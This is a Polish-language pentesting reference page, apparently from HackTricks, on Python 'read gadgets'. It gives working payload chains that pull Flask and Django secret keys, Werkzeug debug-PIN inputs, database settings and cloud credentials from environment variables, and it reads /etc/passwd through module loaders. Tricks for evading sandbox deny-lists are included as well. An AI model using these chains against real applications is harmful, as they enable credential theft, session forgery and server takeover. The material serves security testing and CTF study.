# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Różne podatności, takie jak [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) lub [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogą pozwolić na **odczyt wewnętrznych danych Pythona, ale nie pozwolą na wykonanie kodu**. Dlatego pentester będzie musiał maksymalnie wykorzystać te uprawnienia odczytu, aby **uzyskać wrażliwe uprawnienia i zwiększyć wpływ podatności**.

### Flask - Odczyt secret key

Strona główna aplikacji Flask prawdopodobnie będzie zawierać globalny obiekt **`app`**, w którym skonfigurowany jest ten **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
W tym przypadku można uzyskać dostęp do tego obiektu, używając dowolnego gadgetu do **uzyskiwania dostępu do obiektów globalnych** ze strony [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

W przypadku gdy **podatność znajduje się w innym pliku Pythona**, potrzebny jest gadget do przemierzania plików, aby dotrzeć do głównego pliku i **uzyskać dostęp do obiektu globalnego `app.secret_key`**, a następnie móc [**eskalować uprawnienia** dzięki znajomości tego klucza](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload taki jak ten [z tego writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Użyj tego payloadu, aby **odczytać `app.secret_key`**. Jeśli oryginalny bug zapewnia również primitive zapisu (na przykład class pollution), tej samej ścieżki można użyć do zastąpienia go i podpisywania bardziej uprzywilejowanych Flask cookies.

### Werkzeug - machine_id i node uuid

[**Używając tych payloadów z tego writeupu**](https://vozec.fr/writeups/tweedle-dum-dee/) uzyskasz dostęp do **machine_id** i **uuid** node, czyli **prywatnych bitów** potrzebnych do [**wygenerowania Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i uzyskania dostępu do konsoli Pythona w `/console`, jeśli **tryb debugowania jest włączony**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Pamiętaj, że możesz uzyskać **lokalną ścieżkę serwera do `app.py`**, generując jakiś **błąd** na stronie internetowej, który **poda Ci tę ścieżkę**.

Jeśli podatność znajduje się w innym pliku Pythona, sprawdź wcześniejszy trick Flask, aby uzyskać dostęp do obiektów z głównego pliku Pythona.

### Django - SECRET_KEY i moduł settings

Obiekt settings Django jest buforowany w `sys.modules` po uruchomieniu aplikacji. Korzystając wyłącznie z prymitywów odczytu, możesz wykraść **`SECRET_KEY`**, klucze zapasowe, dane uwierzytelniające bazy danych lub sole podpisywania:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Jeśli podatny gadget znajduje się w innym module, najpierw przejrzyj globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` są równie wartościowe jak bieżący `SECRET_KEY`: nadal weryfikują stare podpisane wartości podczas rotacji. Ujawnij także `SESSION_ENGINE` i `SESSION_SERIALIZER`, aby szybko ustalić, czy wpływ ogranicza się tylko do fałszowania cookies, czy jest poważniejszy. Szczegółowe informacje o wpływie na web znajdziesz na [**stronie pentestingu Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets ładowarki modułów — odczyt kodu źródłowego i plików

Załadowane moduły Python zwykle zachowują `__loader__`. Ładowarki oparte na plikach często udostępniają `get_source()` i `get_data()`, które są idealnymi **prymitywami tylko do odczytu**, gdy możesz już uzyskać dostęp do obiektu modułu, ale nie do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Jest to bardzo przydatne do zrzucania **config modules, blueprints, helper files lub hidden routes** oraz odzyskiwania kluczy API, DSN-ów, ścieżek flag lub dodatkowych punktów wejścia gadgetów.

Jeśli masz tylko enumerację podklas, wyszukaj loader po nazwie zamiast hardkodować indeks:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals generatora / frame coroutine

Jeśli możesz utworzyć obiekt generatora/coroutine lub uzyskać do niego dostęp, jego frame może ujawnić globals **bez potrzeby użycia jakiegokolwiek gadgetu `__globals__`**. Jest to przydatne przeciwko filtrom, które blokują tylko nazwy dunder i pomijają atrybuty frame, takie jak `gi_frame`, `ag_frame`, `cr_frame` lub `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Po uzyskaniu globalnych zmiennych ramki kontynuuj dokładnie tak jak w przypadku innych gadgets (`sys.modules`, obiektów settings, `os.environ` itd.). Ostatnie sandbox escapes wciąż na nowo odkrywają tę możliwość, ponieważ `gi_frame` i `f_globals` nie są atrybutami dunder i często przetrwają naiwne deny-listy.

### Zmienne środowiskowe / cloud creds za pośrednictwem załadowanych modułów

Wiele jaili nadal importuje gdzieś `os` lub `sys`. Możesz wykorzystać dowolną osiągalną funkcję `__init__.__globals__`, aby przejść do już zaimportowanego modułu `os` i zrzucić **zmienne środowiskowe** zawierające tokeny API, klucze cloud lub flagi:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Jeśli indeks podklasy jest filtrowany, użyj loaderów:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Zmienne środowiskowe są często jedynymi sekretami potrzebnymi do przejścia od odczytu do pełnego przejęcia (klucze cloud IAM, URL-e baz danych, klucze podpisywania itp.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) umożliwiał **class pollution** za pośrednictwem spreparowanych żądań komponentów. Ustawienie ścieżki właściwości, takiej jak `__init__.__globals__`, pozwalało atakującemu uzyskać dostęp do zmiennych globalnych modułu komponentu oraz wszystkich zaimportowanych modułów (np. `settings`, `os`, `sys`). Dzięki temu można było wykraść `SECRET_KEY`, `DATABASES` lub dane uwierzytelniające usług bez wykonywania kodu. Łańcuch exploita opiera się wyłącznie na odczycie i wykorzystuje te same wzorce dunder-gadgetów co powyżej.

### Kolekcje gadgetów do chainingu

Najnowsze CTF-y i badania pyjail pokazują niezawodne łańcuchy odczytu zbudowane wyłącznie przy użyciu dostępu do atrybutów i enumeracji podklas. Listy utrzymywane przez społeczność, takie jak [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogują setki minimalnych gadgetów, które można łączyć w celu przechodzenia od obiektów do `__globals__`, `sys.modules`, a następnie do poufnych danych. Preferuj wyszukiwanie oparte na atrybutach/nazwach zamiast surowych indeksów podklas, ponieważ pozycja `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. zmienia się między wersjami Pythona oraz wraz z dodatkowymi zaimportowanymi bibliotekami.

## Referencje

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
